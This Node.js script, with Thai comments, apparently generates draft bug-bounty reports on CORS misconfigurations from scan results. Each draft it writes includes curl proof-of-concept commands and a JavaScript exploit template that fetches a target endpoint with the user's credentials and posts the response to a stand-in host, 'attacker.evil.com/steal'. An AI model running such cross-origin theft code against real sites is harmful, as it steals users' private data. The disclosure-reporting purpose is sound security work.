#!/usr/bin/env node
/**
 * SARAhack - Report Generator
 * สร้างรีพอต MD อัตโนมัติจาก cors_scan_results_batch2.json
 */

const fs = require('fs');
const path = require('path');

// กำหนด path ถูกต้อง
const REPORTS_DIR = __dirname;
const DATA_FILE = path.join(REPORTS_DIR, 'cors_scan_results_batch2.json');
const OUTPUT_DIR = path.join(REPORTS_DIR, 'drafts');
const TEMPLATE_FILE = path.join(REPORTS_DIR, 'templates', 'cors_report.md');

// สร้าง drafts directory ถ้ายังไม่มี
if (!fs.existsSync(OUTPUT_DIR)) {
  fs.mkdirSync(OUTPUT_DIR, { recursive: true });
}

// อ่าน template
const template = fs.readFileSync(TEMPLATE_FILE, 'utf8');

// อ่านข้อมูล
const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));

// จัดกลุ่มตามโปรแกรม
const programs = {};
data.findings.forEach(f => {
  if (!programs[f.program]) {
    programs[f.program] = {
      severity: f.severity,
      findings: []
    };
  }
  programs[f.program].findings.push(f);
});

// แปลง severity string เป็นตัวเลข
function severityToNum(s) {
  const map = { 'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1 };
  return map[s] || 0;
}

// หา severity สูงสุด
function getMaxSeverity(findings) {
  let max = 'LOW';
  let num = 0;
  findings.forEach(f => {
    if (severityToNum(f.severity) > num) {
      num = severityToNum(f.severity);
      max = f.severity;
    }
  });
  return max;
}

// สร้าง report สำหรับโปรแกรม
function generateReport(programName, programData) {
  const maxSeverity = getMaxSeverity(programData.findings);
  const date = new Date().toISOString().split('T')[0];
  
  // รวบรวม endpoints ที่ unique
  const endpoints = programData.findings.map(f => f.url);
  const uniqueEndpoints = [...new Set(endpoints)];
  
  // สร้างตาราง endpoints
  let endpointTable = '| Endpoint | Method | ACAO | ACAC | Status |\n';
  endpointTable += '|----------|--------|------|------|--------|\n';
  
  programData.findings.slice(0, 15).forEach(f => {
    endpointTable += '| `' + f.url + '` | ' + (f.acam || 'GET') + ' | ' + f.acao + ' | ' + (f.acac || '-') + ' | ' + f.status_code + ' |\n';
  });

  // PoC curl commands
  let pocCurl = '';
  uniqueEndpoints.slice(0, 3).forEach(url => {
    pocCurl += '# Test ' + url + '\n';
    pocCurl += 'curl -i "' + url + '" -H "Origin: https://attacker.evil.com"\n\n';
  });

  // สร้าง JavaScript exploit
  const jsExploit = '// Malicious page exploit\nfetch(\"' + uniqueEndpoints[0] + '\", {\n  credentials: \"include\"\n}).then(response => response.json())\n  .then(data => {\n    // Send stolen data to attacker\n    fetch(\"https://attacker.evil.com/steal\", {\n      method: \"POST\",\n      body: JSON.stringify(data)\n    });\n  });';

  // Copy template และ replace values
  let report = template;
  
  // แทนที่ค่าต่างๆ
  report = report.replace(/PROGRAM/g, programName.toUpperCase());
  report = report.replace(/YYYY-MM-DD/g, date);
  report = report.replace(/SARAhack/g, 'SARAhack');
  
  // แทนที่ severity
  report = report.replace(/HIGH \/ MEDIUM \/ LOW/g, maxSeverity);
  
  // แทนที่ endpoint แรก
  report = report.replace(/`\\[TARGET_ENDPOINT\\]`/g, '`' + uniqueEndpoints[0] + '`');
  
  // แทนที่ endpoints table
  report = report.replace(
    /(\/api\/v1\/profile.*\n)/,
    endpointTable
  );

  // แทนที่ PoC
  report = report.replace(
    /(# Step 1: Test normal request\n)[\\S\n]*/,
    pocCurl
  );

  // แทนที่ JavaScript exploit
  report = report.replace(
    /(fetch\neysp.*\n)/,
    jsExploit + '\n'
  );

  return report;
}

// ตรวจสอบว่ามี draft report อยู่แล้วหรือไม่
function draftExists(programName) {
  const draftFile = path.join(OUTPUT_DIR, 'draft_' + programName.toLowerCase() + '_cors.md');
  return fs.existsSync(draftFile);
}

// สร้าง reports
console.log('🎯 SARAhack Report Generator');
console.log('============================\n');

let created = 0;
let skipped = 0;

Object.keys(programs).sort().forEach(programName => {
  const outputFile = path.join(OUTPUT_DIR, 'draft_' + programName.toLowerCase() + '_cors.md');
  
  // ข้ามถ้ามี draft อยู่แล้ว
  if (draftExists(programName)) {
    console.log('⏭️  Skipped ' + programName + ' (draft exists)');
    skipped++;
    return;
  }
  
  const report = generateReport(programName, programs[programName]);
  fs.writeFileSync(outputFile, report);
  console.log('✅ Created draft_' + programName.toLowerCase() + '_cors.md');
  created++;
});

console.log('\n============================');
console.log('📊 Summary: ' + created + ' created, ' + skipped + ' skipped');
console.log('📁 Output: ' + OUTPUT_DIR + '/');

// แสดงรายชื่อไฟล์ที่สร้าง
console.log('\n📋 Files created:');
const draftFiles = fs.readdirSync(OUTPUT_DIR).filter(f => f.endsWith('.md'));
draftFiles.forEach(f => console.log('  - ' + f));